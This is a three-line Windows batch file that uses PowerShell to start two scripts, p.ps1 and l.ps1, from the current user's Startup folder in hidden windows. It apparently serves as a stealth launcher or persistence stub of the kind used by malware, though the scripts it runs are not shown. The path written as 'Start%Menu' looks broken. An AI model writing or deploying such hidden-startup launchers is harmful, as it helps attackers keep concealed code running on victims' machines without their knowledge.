@echo off
powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/p.ps1"
powershell Start-Process powershell.exe -windowstyle hidden "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start%Menu/Programs/Startup/l.ps1"
